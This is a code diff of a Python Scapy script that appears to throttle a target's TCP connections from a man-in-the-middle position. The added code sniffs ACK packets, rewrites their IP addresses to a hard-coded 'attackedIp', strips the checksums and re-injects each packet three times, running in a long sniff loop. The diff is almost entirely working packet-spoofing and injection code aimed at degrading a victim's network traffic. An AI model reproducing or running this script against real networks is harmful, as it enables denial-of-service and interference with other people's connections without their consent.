@@ -9,8 +9,6 @@
 # and the approach for throttling which should be used.
 
 import logging
-import random
-import time
 logger = logging.getLogger("scapy")
 logger.setLevel(logging.CRITICAL)
 # logger.setLevel(logging.INFO)
@@ -26,32 +24,29 @@ def throttleTCP(sourceIP, destIp, throttle):
         print("Select either 'dublicateACK' or 'RST' as throttle method.")
         
 # throttleTCP("localhost", "localhost", "RST")
-sourceIp = "localhost"
-destIp = "localhost"
 
-# sport = random.randint(1024, 65535)
-# SYN
-# ip = IP(src="192.168.0.197", dst=destIp)
-# SYN = TCP(sport=sport, dport=443, flags='S', seq=1000)
-# SYNACK = sr1(ip/SYN)
-
-# # SYN-ACK
-# ACK = TCP(sport=sport, dport=443, flags='A', seq=SYNACK.ack + 1, ack=SYNACK.seq + 1)
-# send(ip/ACK)
-
+usedAcks = set()
+attackedIp = "192.168.0.177"
+mitmIp = "192.168.0.192"
 
 def retransmit_ack(packet):
     if packet.haslayer(TCP) and packet[TCP].flags == "A":  # Checking for ACK flag
-        print(f"Captured ACK Packet: {packet.summary()}")
+        print(f"Captured new ACK Packet: {packet.summary()} with number {packet[TCP].ack}")
+        incomingAck = packet[TCP].ack
+        if incomingAck not in usedAcks:
+            print(f"Captured new ACK Packet: {packet.summary()}")
+            print(f"Ack is: {incomingAck}")
+            usedAcks.add(incomingAck)
+            new_packet = packet.copy()
+            new_packet[IP].dst = attackedIp
+            new_packet[IP].src = attackedIp
+            del new_packet[IP].chksum
+            del new_packet[TCP].chksum
+            sendp(new_packet, iface="enp3s0", count=3, inter=0.0)  
+            print("Retransmitted ACK Packet.")
 
-        # Modify if necessary (e.g., changing TTL, sequence number, etc.)
-        new_packet = packet.copy()
+def main():
+    sniff(prn=retransmit_ack, count=1000000) 
 
-        # Send the modified or original ACK packet
-        sendp(new_packet, iface="en0", count=3, inter=0.5)  
-
-        print("Retransmitted ACK Packet.")
-
-# capture = sniff(count=1)
-# print(capture.summary())
-sniff(prn=retransmit_ack, iface="en0", count=1) 
+if __name__=="__main__":
+    main()
